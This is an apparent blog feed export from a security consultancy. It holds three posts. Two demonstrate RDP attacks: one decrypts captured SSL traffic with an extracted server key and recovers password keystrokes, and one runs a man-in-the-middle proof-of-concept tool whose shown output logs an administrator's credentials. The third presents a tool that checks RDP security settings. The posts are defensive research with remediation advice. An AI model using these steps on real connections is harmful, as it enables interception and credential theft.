+<p>Put in more technical language: This post is about <a title="Perfect Forward Secrecy" href="http://en.wikipedia.org/wiki/Perfect_forward_secrecy">Perfect Forward Secrecy</a>, how SSL connections often lack this desirable security property, that RDP uses SSL and therefore could also be vulnerable to retrospective decryption.</p>
+<h2>Recording encrypted RDP connections with Wireshark</h2>
+<p>I simply started recorded all traffic on my ethernet interface, then connected to an RDP server using mstsc and entered a password. I stopped the capture straight after entering a password.</p>
+<h2>How to tell if your RDP session is vulnerable</h2>
+<p>If you first &#8220;Analyze | Follow TCP Stream&#8221; for the TCP port 3389 traffic, then &#8220;Analyze | Decode As&#8230; | SSL&#8221;, Wireshark will show you the SSL Server Hello message. Check if it&#8217;s an RSA-based cipher suite.  If it is, this post applies to your RDP session and will show you how to decrypt it.</p>
+<div id="attachment_1521" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/attachment/serverhello-showing-the-ssl-cipher-suite/" rel="attachment wp-att-1521"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rsa-300x116.jpg" alt="ServerHello showing the SSL cipher suite" width="300" height="116" class="size-medium wp-image-1521" /></a><p class="wp-caption-text">ServerHello showing the SSL cipher suite</p></div>
+<p>Note that I&#8217;ve only tried this for plain SSL-based RDP connection &#8211; as opposed to CredSSP (SSL+NLA) connections, so YMMV.</p>
+<p>On with the decryption&#8230;</p>
+<h2>Extracting private SSL keys for service certificates</h2>
+<p>Following a compromise of a server, an attacker with administrator level privileges could simply extract the private keys used for server authentication from the certificate store.</p>
+<p>The <a title="geocerts site" href="https://www.geocerts.com/support/migrate_iis">geocerts site</a> provides as good a walkthrough of how to do this as any other. The certificate used by the Terminal Server are in the &#8220;Personal&#8221; or &#8220;Remote Desktop&#8221; certificate store for the &#8220;Computer Account&#8221;. Simply use MMC&#8217;s &#8220;Certificates&#8221; plugin to export the private key for the SSL certificate. I exported in .pfx format, which requires you to set a password.</p>
+<p>I&#8217;m using Windows 2003 Server for this demo. I&#8217;m aware that extracting the required certificates from later versions of Windows is harder. This is left as an exercise for the reader. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<h2>Converting from .pfc to .pem</h2>
+<p>In order to decrypt the SSL traffic we&#8217;ll use Wireshark which requires the private key to be in PEM format (.cer here). Simply convert using this OpenSSL one-liner:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ openssl pkcs12 -in server-cert.pfx -out server-cert.cer -nodes
+</pre>
+<h2>Decrypting traffic with Wireshark</h2>
+<p>Although Wireshark is slightly awkward to use for the decryption of SSL traffic, it worked first time for me using this <a title="tutorial" href="http://support.citrix.com/article/ctx116557">tutorial</a>.</p>
+<p>I specified the RSA key list as:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+192.168.2.96,3389,rdp,/tmp/server-cert.cer
+</pre>
+<p>It was then possible to see all the cleartext traffic in Wireshark.  In the &#8220;Follow TCP Stream&#8221; dialogue, I selected hexdump and scrolled down quite a long way. I was looking for a lot of short messages that corresponded to the keystrokes of the password I entered.</p>
+<div id="attachment_1522" style="width: 263px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/attachment/keystrokes-on-the-wire/" rel="attachment wp-att-1522"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/keystrokes-253x300.jpg" alt="Keystrokes on the wire" width="253" height="300" class="size-medium wp-image-1522" /></a><p class="wp-caption-text">Keystrokes on the wire</p></div>
+<p>Shown in red are the messages from the RDP client. We&#8217;ll inspect each of the 4-byte message starting &#8220;44 04 00&#8243;. These correspond to keys being pressed down &#8211; as opposed to &#8220;44 04 01&#8243; which are keys being released.</p>
+<p>The first message of interest is:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+44 04 00 2a
+</pre>
+<p>Then (omitting a few that aren&#8217;t interesting):</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+44 04 00 19
+44 04 01 2a
+44 04 00 1e
+44 04 00 1f
+44 04 00 1f
+44 04 00 11
+44 04 00 18
+44 04 00 13
+44 04 00 20
+44 04 00 02
+</pre>
+<p>In each case the last of the 4 bytes in the key scan code.  If we <a title="look up" href="http://msdn.microsoft.com/en us/library/aa299374(v=vs.60).aspx">look up</a> each in turn we find:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+44 04 00 2a is Left-Shift-Down
+44 04 00 19 is P
+44 04 01 2a is Left-Shift-Up
+44 04 00 1e is A
+44 04 00 1f is S
+44 04 00 1f is S
+44 04 00 11 is W
+44 04 00 18 is O
+44 04 00 13 is R
+44 04 00 20 is D
+44 04 00 02 is 1
+</pre>
+<p>Making the password `Password1&#8242; when we take account of the position of the SHIFT key.</p>
+<h2>Conclusions</h2>
+<p>The ability for an attacker to retrospectively decrypt SSL traffic can be undesirable in some (fairly unlikely) circumstances. This is not an unusual or isolated example. A great many HTTPS web sites are prone to the same issue.</p>
+<p>This is not a vulnerability in the traditional sense. It rather raises the impact any vulnerability that allows an attacker to steal the private SSL key &#8211; at which point all security claims are naturally null and void anyway.</p>
+<p>Actually, it&#8217;s interesting to review the lack of perfect forward secrecy against <a title="Microsoft's definition of a security vulnerability" href="http://technet.microsoft.com/en-us/library/cc751383.aspx">Microsoft&#8217;s definition of a security vulnerability</a>. It does not seem to fit the definition. If lack of forward secrecy does indeed present a problem, the problem results &#8221;from adhering to imperfect but widely accepted standards&#8221;.</p>
+<p>Disabling support for RSA as the Key Exchange Algorithm is the usual remedy for this SSL issue. However, I haven&#8217;t been able to find a working solution on Windows 2003. I did experiment with setting this registry key:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms\PKCS\Enabled = 0  (don't do this)
+</pre>
+<p>after reading <a title="KB245030" href="http://support.microsoft.com/kb/245030">KB245030</a>. However, I only succeeded in preventing RDP connections entirely!</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/">Retrospective decryption of SSL-encrypted RDP sessions</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>SSL &#8220;Man-In-The-Middle&#8221; attacks on RDP</title>
+		<link>https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/</link>
+		<comments>https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/#comments</comments>
+		<pubDate>Tue, 04 Mar 2014 09:30:49 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[MiTM]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1510</guid>
+		<description><![CDATA[<p>This post seeks to demonstrate why users learning to ignore those certificate warnings for SSL-based RDP connection could leave them open to &#8220;Man-In-The-Middle&#8221; attacks. The MiTM attack demonstrated displays keystrokes sent during an RDP session. We conclude with some advice on how to avoid being the victim of such an attack. Types of RDP connections [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/">SSL &#8220;Man-In-The-Middle&#8221; attacks on RDP</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This post seeks to demonstrate why users learning to ignore those certificate warnings for SSL-based RDP connection could leave them open to &#8220;Man-In-The-Middle&#8221; attacks. The MiTM attack demonstrated displays keystrokes sent during an RDP session. We conclude with some advice on how to avoid being the victim of such an attack.<span id="more-1510"></span></p>
+<h2>Types of RDP connections</h2>
+<p>Before we start, let&#8217;s first clarify which of the various RDP connection types this post is about. There are 3 types of connection:</p>
+<ul>
+<li>RDP Security Layer</li>
+<li>SSL (TLS 1.0)</li>
+<li>CredSSP (SSL with NLA)</li>
+</ul>
+<p>It&#8217;s the middle one we&#8217;ll demonstrate an attack on in this post. On the Terminal Server, SSL is configured like this (with any NLA checkboxes unticked):</p>
+<div id="attachment_1492" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/?attachment_id=1492" rel="attachment wp-att-1492"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-not-vulnerable-300x233.png" alt="RDP configuration used" width="300" height="233" class="size-medium wp-image-1492" /></a><p class="wp-caption-text">RDP configuration used</p></div>
+<div id="attachment_1492" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1511"><div class="lb-album"><a href="#image-1511"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-not-vulnerable-300x233.png" alt="2003-rdp-setting-not-vulnerable" class="size-medium wp-image-1492"><span></span></a></div>              
+<a href="#imageclose-1511" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1511">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-not-vulnerable.png" alt="image-1511">
+                   </div></a><p class="wp-caption-text">RDP configuration used</p></div>
+<p>Some connections may also be vulnerable if the server is set to &#8220;Negotiate&#8221; its Security Layer to &#8211; as that could result in SSL being used.</p>
+<h2>SSL certificate warning</h2>
+<p>If users are used to dismissing a warnings like this one each time they connect, then this post is relevant to them:</p>
+<div id="attachment_1496" style="width: 267px" class="wp-caption alignnone"><a name="imageclose-1512"><div class="lb-album"><a href="#image-1512"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning-257x300.png" alt="ssl-warning" class="size-medium wp-image-1496"><span></span></a></div>              
+<a href="#imageclose-1512" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1512">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning.png" alt="image-1512">
+                   </div></a><p class="wp-caption-text">SSL warning that should not be routinely ignored</p></div>
+<h2>Attack overview</h2>
+<p>At a high level, the attack will proceed in a similar way to any SSL MiTM attack:</p>
+<ol>
+<li>Have the victim connect to a PoC tool (rdp-ssl-mitm.py) on our system instead of the RDP server they&#8217;re trying to reach</li>
+<li>Using the RDP protocol, our tool will negotiate the use of SSL</li>
+<li>At the point the connection is upgraded to SSL, our tool will negotiate an SSL connection with the RDP client using its own (untrusted) SSL certificate. This will give our tool access to data sent by the RDP client in cleartext</li>
+<li>Our tool also needs to create an SSL connection with the legitimate RDP server down which it will send data from the RDP client</li>
+</ol>
+<p>The only complication to this attack is that our tool has to talk the RDP protocol briefly before creating the required SSL connections.</p>
+<h3>1. Having the victim connect to us</h3>
+<p>In a real attack, we&#8217;d need to have the RDP client connect to our system instead of the target server. This could be achieved using ARP spoofing, DNS spoofing or some other method. Rather than cloud the demonstration with such details, we&#8217;ll assume this is step is possible and just type the IP address of the attacker system into the victim RDP client.</p>
+<p>On our attacker system (192.168.190.170), we start our PoC tool. We tell it forward connections to the legitimate RDP server 192.168.2.96:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./rdp-ssl-mitm.py -r 192.168.2.96:3389
+[+] Listening for connections on 0.0.0.0:3389
+</pre>
+<p>And we simply enter the IP address of the attacker system into the RDP client (the client connects from 192.168.190.1):</p>
+<div id="attachment_1495" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1513"><div class="lb-album"><a href="#image-1513"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon-300x177.jpg" alt="rdp-attack-prior-to-logon" class="size-medium wp-image-1495"><span></span></a></div>              
+<a href="#imageclose-1513" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1513">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon.jpg" alt="image-1513">
+                   </div></a><p class="wp-caption-text">We enter the attacker IP address to avoid the complexity of ARP spoofing</p></div>
+<h3>2. Talk RDP to the client to negotiate the use of SSL</h3>
+<p>The negotiation of SSL is quite short within the RDP protocol:</p>
+<p>Message #1: Client > MiTM > Server</p>
+<pre class="brush: plain; gutter: false; highlight: [1]; title: ; notranslate">
+03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 *03*
+00 00 00
+</pre>
+<p>This message is fairly static and our tool just passes it through to the server unaltered. The *03* means that the client supports RDP Security Layer, SSL and CredSSP.</p>
+<p>Message #2: Server > MiTM > Client</p>
+<pre class="brush: plain; gutter: false; highlight: [1]; title: ; notranslate">
+03 00 00 13 0e d0 00 00 12 34 00 02 00 08 00 *01*
+00 00 00
+</pre>
+<p>In the next message the server chooses the protocol to use. The *01* in this case means the the server has chosen SSL (not CredSSP which would be *02*). Again, we pass this message back to the client unaltered.</p>
+<p>Note that if the server were to select CredSSP (*02*), then the demonstration would fail. We&#8217;re attacking SSL, not CredSSP.</p>
+<h3>3. Create SSL connection with RDP client</h3>
+<p>Message #3: Client > MiTM</p>
+<p>The 3rd message is the start of an SSL connection. Here is the SSL Client Hello message beginning *16 03 01*&#8230; (03 01 being the version of SSL used: SSL 3.1 AKA TLS 1.0).</p>
+<pre class="brush: plain; gutter: false; highlight: [1]; title: ; notranslate">
+*16 03 01* 00 5a 01 00 00 56 03 01 52 21 ac be 63
+20 ce de 4b a5 90 18 f0 66 97 ee 9d 54 14 e3 1c
+... snip ...
+</pre>
+<p>Our tool does not forward this data directly to the server. Instead it responds with a &#8220;SSL Server Hello&#8221; message and proceeds to complete the SSL connection with the client.</p>
+<p>The SSL certificate we present to the RDP client is issued to fred and this is displayed in the mstsc SSL warning shown to the user:</p>
+<div id="attachment_1517" style="width: 265px" class="wp-caption alignnone"><a name="imageclose-1514"><div class="lb-album"><a href="#image-1514"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/fred-255x300.jpg" alt="fred" class="size-medium wp-image-1517"><span></span></a></div>              
+<a href="#imageclose-1514" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1514">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/fred.jpg" alt="image-1514">
+                   </div></a><p class="wp-caption-text">The certificate presented by our PoC tool causes this security warning</p></div>
+<p>The details of the SSL certificate differ to those the user would normally see &#8211; if the user were to check. To refine the attack we could make the certificate details match more closely, but we&#8217;d never get the signature to be the same as the normal certificate, so there&#8217;d always be a difference.</p>
+<h3>4. Create SSL connection with RDP server</h3>
+<p>Simultaneously, our tool also sends and SSL Client Hello to the RDP server and creates a second SSL connection.</p>
+<h2>Displaying key strokes</h2>
+<p>Our tool is now in a position to display the cleartext messages about keystrokes (for example) sent by the RDP client. It is relatively easy to determine what sort of message is sent when a key is pressed. The following two 4-byte messages are sent when the &#8216;p&#8217; key is pressed:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+44 04 00 19
+44 04 01 19
+</pre>
+<p>The 3rd byte is the direction of key (00 means key-down, 01 means key-up).  The 4th byte is the key scan code.  If we <a title="look up" href="http://msdn.microsoft.com/en-us/library/aa299374%28v=vs.60%29.aspx">look up</a> 0&#215;19 we find it corresponds to the p key.</p>
+<p>In the general case, the scan-code to character mapping depends which keyboard you&#8217;re using. In the PoC tool I implemented the mapping for for QWERTY keyboards, so if you have a UK/US keyboard, it should translate the majority of scan-codes to the correct characters. Note that we don&#8217;t get know whether characters are uppercase or lowercase. We&#8217;d have to manually track the status of CAPS Lock and SHIFT keys.</p>
+<p>Without getting too bogged down in the details, here&#8217;s some sample output from the PoC tool that shows keystrokes being logged &#8211; in particular an administrator logging in with username Administrator, password Password:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./rdp-ssl-mitm.py -r 192.168.2.96:3389 
+[+] Listening for connections on 0.0.0.0:3389
+[+] Incoming connection from 192.168.190.1:60370
+[+] New outgoing request to 192.168.2.96:3389 (SSL: 0)
+[+] Connected
+[+] Detected incoming SSL connection. Turning self into SSL socket
+[+] Incoming connection from 192.168.190.1:60374
+[+] New outgoing request to 192.168.2.96:3389 (SSL: 0)
+[+] Connected
+[+] Detected incoming SSL connection. Turning self into SSL socket
+&lt;LShift-down&gt;A&lt;LShift-up&gt;DMINISTRATOR&lt;Tab&gt;&lt;LShift-down&gt;P&lt;LShift-up&gt;ASSWORD&lt;Enter&gt;
+</pre>
+<h2>Conclusions</h2>
+<p>Learning to ignore SSL certificate warnings is as bad for RDP connection as it is for HTTPS web sites. The results are similar: users quickly become vulnerable to &#8220;Man-In-The-Middle&#8221; attacks. Such attacks can harvest usernames, passwords, keystrokes and other sensitive data.</p>
+<p>Using SSL certificates that are signed by a Certificate Authority the RDP client trusts will result in no warning under normal operation, so is highly recommended.</p>
+<p>This attack doesn&#8217;t work if the server mandates NLA, so using NLA is also highly recommended.</p>
+<p>It&#8217;s important to note that this isn&#8217;t a vulnerability in the RDP Client or Server software. Nor is this a  new discovery. It&#8217;s a weakness in way RDP is sometimes used which stems from users ignoring security warnings. At a technical level, this is a fairly vanilla SSL MiTM attack.</p>
+<p>It might be interesting to extend this work by recording screen captures; or by injecting images of login boxes to encourage users to part of with other credentials. There would also be an opportunity to attack any drives that the RDP client has mapped for drive redirection &#8211; see <a title="Attacking the RDP client" href="http://tombstone-bbs.co.uk/reverse-rdp/reverse-rdp.html">Attacking the RDP Clients</a> for inspiration. These would be pretty demanding coding challenges, though!</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/">SSL &#8220;Man-In-The-Middle&#8221; attacks on RDP</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>rdp-sec-check</title>
+		<link>https://labs.portcullis.co.uk/tools/rdp-sec-check/</link>
+		<comments>https://labs.portcullis.co.uk/tools/rdp-sec-check/#comments</comments>
+		<pubDate>Wed, 12 Feb 2014 11:14:44 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Tools]]></category>
+		<category><![CDATA[RDP]]></category>
+
+		<guid isPermaLink="false">http://wordpress.65535.com/blogtest/?p=193</guid>
+		<description><![CDATA[<p>rdp-sec-check is a Perl script to enumerate security settings of an RDP Service (AKA Terminal Services). Key features Support for targets file Support for saving the tool output to a specified logfile Control over the connection and responses timeouts Control over the number of retries when timeouts occurs Overview rdp-sec-check is a Perl script to [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/rdp-sec-check/">rdp-sec-check</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>rdp-sec-check is a Perl script to enumerate security settings of an RDP Service (AKA Terminal Services).<span id="more-193"></span></p>
+<h2>Key features</h2>
+<ul>
+<li>Support for targets file</li>
+<li>Support for saving the tool output to a specified logfile</li>
+<li>Control over the connection and responses timeouts</li>
+<li>Control over the number of retries when timeouts occurs</li>
+</ul>
+<h2>Overview</h2>
+<p>rdp-sec-check is a Perl script to enumerate the different security settings of an remote destktop service (AKA Terminal Services).</p>
+<p>It does not require authentication, only network connectivity to TCP port 3389.</p>
+<p>It can determine many (though not quite all) of the security settings from the RDP-Tcp Properties | General tab:</p>
+<ul>
+<li>Check which security layers are supported by the service: Standard RDP Security, TLSv1.0, CredSSP</li>
+<li>For Standard RDP Security it detects the level of encryption supported: 40-bit, 56-bit, 128-bit, FIPS</li>
+</ul>
+<p>The following potential security issues are flagged if present:</p>
+<ul>
+<li>The service supports Standard RDP Security &#8211; rhis is known to be vulnerable to an active &#8220;Man-In-The-Middle&#8221; attack</li>
+<li>The service supports weak encryption (40-bit or 56-bit)</li>
+<li>The service does not mandate Network Level Authentication (NLA) - NLA can help to prevent certain types of Denial of Service attack</li>
+<li>The service supports FIPS encryption but doesn&#8217;t mandate it &#8211; may only be interesting for jurisdictions where FIPS is required</li>
+</ul>
+<h2>Requirements</h2>
+<p>rdp-sec-check is a simple Perl script that requires one module from CPAN. Run &#8216;cpan&#8217; as root then install the Encoding::BER module:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# cpan
+cpan[1]&gt; install Encoding::BER
+</pre>
+<h2>Example output 1: An old Windows 2000 RDP service</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rdp-sec-check.pl 10.0.0.94
+Starting rdp-sec-check v0.8-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Mon Jul  9 13:34:38 2012
+
+Target:    10.0.0.94
+IP:        10.0.0.94
+Port:      3389
+
+[+] Checking supported protocols
+
+[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Negotiation ignored - old Windows 2000/XP/2003 system?
+[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Negotiation ignored - old Windows 2000/XP/2003 system?
+[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Negotiation ignored - old Windows 2000/XP/2003 system??
+
+[+] Checking RDP Security Layer
+
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported
+
+[+] Summary of protocol support
+
+[-] 10.0.0.94:3389 supports PROTOCOL_RDP   : TRUE
+[-] 10.0.0.94:3389 supports PROTOCOL_HYBRID: FALSE
+[-] 10.0.0.94:3389 supports PROTOCOL_SSL   : FALSE
+
+[+] Summary of RDP encryption support
+
+[-] 10.0.0.94:3389 has encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] 10.0.0.94:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
+[-] 10.0.0.94:3389 supports ENCRYPTION_METHOD_40BIT  : TRUE
+[-] 10.0.0.94:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
+[-] 10.0.0.94:3389 supports ENCRYPTION_METHOD_56BIT  : TRUE
+[-] 10.0.0.94:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE
+
+[+] Summary of security issues
+
+[-] 10.0.0.94:3389 has issue NLA_NOT_SUPPORTED_DOS
+[-] 10.0.0.94:3389 has issue ONLY_RDP_SUPPORTED_MITM
+[-] 10.0.0.94:3389 has issue WEAK_RDP_ENCRYPTION_SUPPORTED
+
+rdp-sec-check v0.8-beta completed at Mon Jul  9 13:34:39 2012
+</pre>
+<h2>Example output 2: A Windows 2003 SP0 RDP service</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rdp-sec-check.pl 10.0.0.93
+Starting rdp-sec-check v0.8-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Mon Jul  9 13:35:34 2012
+
+Target:    10.0.0.93
+IP:        10.0.0.93
+Port:      3389
+
+[+] Checking supported protocols
+
+[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Negotiation ignored - old Windows 2000/XP/2003 system?
+[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Negotiation ignored - old Windows 2000/XP/2003 system?
+[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Negotiation ignored - old Windows 2000/XP/2003 system??
+
+[+] Checking RDP Security Layer
+
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+
+[+] Summary of protocol support
+
+[-] 10.0.0.93:3389 supports PROTOCOL_RDP   : TRUE
+[-] 10.0.0.93:3389 supports PROTOCOL_HYBRID: FALSE
+[-] 10.0.0.93:3389 supports PROTOCOL_SSL   : FALSE
+
+[+] Summary of RDP encryption support
+
+[-] 10.0.0.93:3389 has encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] 10.0.0.93:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
+[-] 10.0.0.93:3389 supports ENCRYPTION_METHOD_40BIT  : TRUE
+[-] 10.0.0.93:3389 supports ENCRYPTION_METHOD_128BIT : TRUE
+[-] 10.0.0.93:3389 supports ENCRYPTION_METHOD_56BIT  : TRUE
+[-] 10.0.0.93:3389 supports ENCRYPTION_METHOD_FIPS   : TRUE
+
+[+] Summary of security issues
+
+[-] 10.0.0.93:3389 has issue NLA_NOT_SUPPORTED_DOS
+[-] 10.0.0.93:3389 has issue FIPS_SUPPORTED_BUT_NOT_MANDATED
+[-] 10.0.0.93:3389 has issue ONLY_RDP_SUPPORTED_MITM
+[-] 10.0.0.93:3389 has issue WEAK_RDP_ENCRYPTION_SUPPORTED
+</pre>
+<h2>Example output 3: A typical Windows 2003 RDP service</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rdp-sec-check.pl 10.0.0.111
+Starting rdp-sec-check v0.8-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Mon Jul  9 13:36:56 2012
+
+Target:    10.0.0.111
+IP:        10.0.0.111
+Port:      3389
+
+[+] Checking supported protocols
+
+[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Supported
+[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - SSL_NOT_ALLOWED_BY_SERVER
+[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Not supported - SSL_NOT_ALLOWED_BY_SERVER
+
+[+] Checking RDP Security Layer
+
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+
+[+] Summary of protocol support
+
+[-] 10.0.0.111:3389 supports PROTOCOL_RDP   : TRUE
+[-] 10.0.0.111:3389 supports PROTOCOL_HYBRID: FALSE
+[-] 10.0.0.111:3389 supports PROTOCOL_SSL   : FALSE
+
+[+] Summary of RDP encryption support
+
+[-] 10.0.0.111:3389 has encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] 10.0.0.111:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
+[-] 10.0.0.111:3389 supports ENCRYPTION_METHOD_40BIT  : TRUE
+[-] 10.0.0.111:3389 supports ENCRYPTION_METHOD_128BIT : TRUE
+[-] 10.0.0.111:3389 supports ENCRYPTION_METHOD_56BIT  : TRUE
+[-] 10.0.0.111:3389 supports ENCRYPTION_METHOD_FIPS   : TRUE
+
+[+] Summary of security issues
+
+[-] 10.0.0.111:3389 has issue NLA_NOT_SUPPORTED_DOS
+[-] 10.0.0.111:3389 has issue FIPS_SUPPORTED_BUT_NOT_MANDATED
+[-] 10.0.0.111:3389 has issue ONLY_RDP_SUPPORTED_MITM
+[-] 10.0.0.111:3389 has issue WEAK_RDP_ENCRYPTION_SUPPORTED
+
+rdp-sec-check v0.8-beta completed at Mon Jul  9 13:36:56 2012
+</pre>
+<h2>Example output 4: A well configured Windows 2008 RDP service</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rdp-sec-check.pl 10.0.0.21
+Starting rdp-sec-check v0.8-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Mon Jul  9 13:32:30 2012
+
+Target:    10.0.0.21
+IP:        10.0.0.21
+Port:      3389
+
+[+] Checking supported protocols
+
+[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
+[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
+[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported
+
+[+] Checking RDP Security Layer
+
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
